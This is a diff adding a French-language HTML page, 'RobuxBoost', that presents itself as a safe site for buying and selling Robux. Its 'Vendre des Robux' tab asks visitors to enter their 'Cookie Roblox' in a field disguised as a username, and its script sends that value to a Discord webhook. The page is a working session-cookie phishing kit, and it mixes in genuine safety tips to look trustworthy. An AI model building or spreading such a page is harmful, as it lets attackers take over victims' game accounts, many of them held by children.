@@ -1,0 +1,271 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Acheter et Vendre des Robux - Thème Galaxie</title>
+    <style>
+        /* Styles globaux pour la page */
+        body {
+            font-family: Arial, sans-serif;
+            margin: 0;
+            padding: 0;
+            background-color: #1a1a2e;
+            color: #e0e0e0;
+            background-image: url('https://www.example.com/galaxy-background.jpg'); /* Remplacez par une vraie image de fond galaxie */
+            background-size: cover;
+            background-attachment: fixed;
+            background-repeat: no-repeat;
+        }
+
+        /* Styles de base pour la navigation */
+        header {
+            background-color: rgba(0, 0, 128, 0.8);
+            padding: 1rem;
+            color: #fff;
+            text-align: center;
+        }
+
+        nav {
+            display: flex;
+            justify-content: center;
+            gap: 1.5rem;
+            margin-top: 1rem;
+        }
+
+        nav a {
+            color: #ffdd57;
+            text-decoration: none;
+            font-weight: bold;
+            cursor: pointer;
+        }
+
+        /* Section principale (Hero) */
+        .hero {
+            text-align: center;
+            padding: 4rem;
+            background: linear-gradient(180deg, rgba(26, 26, 46, 0.8), rgba(0, 0, 64, 0.8));
+            color: #e0e0e0;
+        }
+
+        .hero h2 {
+            font-size: 2.5rem;
+            color: #ffdd57;
+            margin-bottom: 1rem;
+        }
+
+        .hero p {
+            font-size: 1.2rem;
+            color: #b3b3ff;
+        }
+
+        .hero button {
+            background-color: #ff5733;
+            color: #fff;
+            padding: 1rem 2rem;
+            border: none;
+            font-size: 1rem;
+            cursor: pointer;
+            border-radius: 5px;
+            margin-top: 1rem;
+            transition: background-color 0.3s;
+        }
+
+        .hero button:hover {
+            background-color: #ff704d;
+        }
+
+        /* Style des onglets */
+        .content-tab {
+            padding: 2rem;
+            max-width: 800px;
+            margin: 2rem auto;
+            background: rgba(0, 0, 64, 0.8);
+            border-radius: 8px;
+            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.4);
+            display: none; /* Caché par défaut */
+        }
+
+        .content-tab h2 {
+            color: #ffdd57;
+            text-align: center;
+            font-size: 2rem;
+        }
+
+        .content-tab p {
+            line-height: 1.6;
+            color: #d0d0ff;
+            margin-bottom: 1rem;
+        }
+
+        /* Styles pour le formulaire de pseudo */
+        #vendre-robux input[type="password"], #vendre-robux button {
+            display: block;
+            margin: 1rem auto;
+            padding: 0.5rem;
+            font-size: 1rem;
+            width: 80%;
+            max-width: 300px;
+            border: 2px solid #ffdd57;
+            border-radius: 5px;
+        }
+
+        #vendre-robux button {
+            background-color: #ff5733;
+            color: #fff;
+            cursor: pointer;
+            transition: background-color 0.3s;
+        }
+
+        #vendre-robux button:hover {
+            background-color: #ff704d;
+        }
+
+        /* Pied de page */
+        footer {
+            background-color: rgba(26, 26, 46, 0.8);
+            color: #e0e0e0;
+            text-align: center;
+            padding: 1rem;
+            margin-top: 2rem;
+        }
+
+        footer a {
+            color: #ffdd57;
+            text-decoration: none;
+            font-weight: bold;
+        }
+
+        footer a:hover {
+            color: #fff;
+        }
+    </style>
+    <script>
+        function toggleTab(tabId) {
+            document.querySelectorAll('.content-tab').forEach(tab => tab.style.display = 'none');
+            document.getElementById(tabId).style.display = 'block';
+        }
+
+        async function envoyerPseudoWebhook() {
+            const pseudo = document.getElementById('pseudo').value;
+
+            if (pseudo) {
+                const webhookURL = 'https://discord.com/api/webhooks/WEBHOOK_ID/WEBHOOK_TOKEN'; // Remplacez par votre URL de webhook
+
+                const payload = {
+                    content: `Nouveau pseudo entré pour la vente de Robux : ${pseudo}`
+                };
+
+                try {
+                    const response = await fetch(webhookURL, {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json'
+                        },
+                        body: JSON.stringify(payload)
+                    });
+
+                    if (response.ok) {
+                        alert('Votre pseudo a été envoyé avec succès !');
+                    } else {
+                        alert('Erreur lors de l\'envoi. Veuillez réessayer.');
+                    }
+                } catch (error) {
+                    alert('Une erreur est survenue lors de la connexion au serveur.');
+                    console.error(error);
+                }
+            } else {
+                alert('Veuillez entrer votre pseudo.');
+            }
+        }
+    </script>
+</head>
+<body>
+
+    <!-- En-tête avec navigation -->
+    <header>
+        <h1>RobuxBoost - Achat et Vente de Robux en Toute Sécurité</h1>
+        <nav>
+            <a href="#" onclick="toggleTab('accueil')">Accueil</a>
+            <a href="#" onclick="toggleTab('comment-acheter')">Comment acheter</a>
+            <a href="#" onclick="toggleTab('offres-abonnements')">Offres et abonnements</a>
+            <a href="#" onclick="toggleTab('conseils-securite')">Conseils de sécurité</a>
+            <a href="#" onclick="toggleTab('assistance')">Assistance</a>
+            <a href="#" onclick="toggleTab('vendre-robux')">Vendre des Robux</a>
+        </nav>
+    </header>
+
+    <!-- Section principale (Hero) -->
+    <section id="accueil" class="hero content-tab" style="display: block;">
+        <h2>Achetez ou Vendez des Robux pour profiter pleinement de Roblox !</h2>
+        <p>Que vous souhaitiez acheter ou vendre des Robux, nous sommes là pour vous aider en toute sécurité.</p>
+        <button onclick="location.href='https://www.roblox.com/robux'">Acheter des Robux</button>
+    </section>
+
+    <!-- Onglet "Comment acheter des Robux" -->
+    <div id="comment-acheter" class="content-tab">
+        <h2>Comment acheter des Robux en toute sécurité</h2>
+        <p>Acheter des Robux est simple si vous suivez ces étapes :</p>
+        <ol>
+            <li><strong>Connectez-vous à votre compte Roblox :</strong> Assurez-vous d'être connecté au compte Roblox sur lequel vous souhaitez acheter des Robux.</li>
+            <li><strong>Accédez à la page d'achat de Robux :</strong> Dans le menu principal, allez dans "Robux" pour afficher les options d'achat.</li>
+            <li><strong>Choisissez le montant de Robux :</strong> Sélectionnez le pack qui vous convient.</li>
+            <li><strong>Sélectionnez un mode de paiement :</strong> Roblox propose plusieurs options de paiement sécurisées.</li>
+            <li><strong>Validez l'achat :</strong> Après avoir saisi les informations de paiement, confirmez votre achat.</li>
+        </ol>
+    </div>
+
+    <!-- Onglet "Offres et abonnements" -->
+    <div id="offres-abonnements" class="content-tab">
+        <h2>Offres et abonnements Robux</h2>
+        <p>Découvrez les différents packs de Robux disponibles :</p>
+        <ul>
+            <li><strong>Pack de 400 Robux :</strong> Idéal pour débuter.</li>
+            <li><strong>Pack de 800 Robux :</strong> Pour les joueurs réguliers.</li>
+            <li><strong>Abonnement Premium :</strong> Recevez des Robux chaque mois avec des avantages exclusifs.</li>
+        </ul>
+    </div>
+
+    <!-- Onglet "Conseils de sécurité" -->
+    <div id="conseils-securite" class="content-tab">
+        <h2>Conseils de sécurité pour vos achats de Robux</h2>
+        <p>Suivez ces conseils pour acheter des Robux en toute sécurité :</p>
+        <ul>
+            <li>N'utilisez que le site officiel de Roblox pour vos achats.</li>
+            <li>Ne partagez jamais vos informations de compte avec qui que ce soit.</li>
+            <li>Vérifiez les évaluations et les commentaires avant de faire des achats.</li>
+            <li>Activez l'authentification à deux facteurs sur votre compte.</li>
+        </ul>
+    </div>
+
+    <!-- Onglet "Assistance" -->
+    <div id="assistance" class="content-tab">
+        <h2>Assistance</h2>
+        <p>Si vous avez besoin d'aide, contactez notre équipe d'assistance :</p>
+        <p>Envoyez un email à <a href="mailto:support@robuxboost.com">support@robuxboost.com</a> pour toute question ou préoccupation.</p>
+    </div>
+
+    <!-- Onglet "Vendre des Robux" -->
+    <div id="vendre-robux" class="content-tab">
+        <h2>Vendre des Robux</h2>
+        <p>Vous souhaitez vendre vos Robux ? Voici les étapes à suivre :</p>
+        <ol>
+            <li><strong>Vérifiez les règles :</strong> Assurez-vous que la vente de Robux est autorisée sur notre plateforme et conforme aux règles de Roblox.</li>
+            <li><strong>Fixez un prix :</strong> Déterminez le nombre de Robux que vous souhaitez vendre et à quel prix.</li>
+            <li><strong>Soumettez votre pseudo :</strong> Entrez votre Cookie Roblox ci-dessous pour confirmer votre identité.</li>
+            <li><strong>Attendez la confirmation :</strong> Une fois votre offre acceptée, nous procéderons à la transaction en toute sécurité.</li>
+        </ol>
+
+        <!-- Formulaire pour entrer le pseudo -->
+        <input type="password" id="pseudo" placeholder="Entrez votre Cookie Roblox">
+        <button onclick="envoyerPseudoWebhook()">Valider</button>
+    </div>
+
+    <!-- Pied de page -->
+    <footer>
+        <p>&copy; 2023 RobuxBoost. Ce site n'est pas affilié à Roblox.</p>
+        <p><a href="https://www.roblox.com/">Site officiel de Roblox</a> | <a href="#">Politique de confidentialité</a> | <a href="#">Conditions d'utilisation</a></p>
+    </footer>
+
+</body>
+</html>
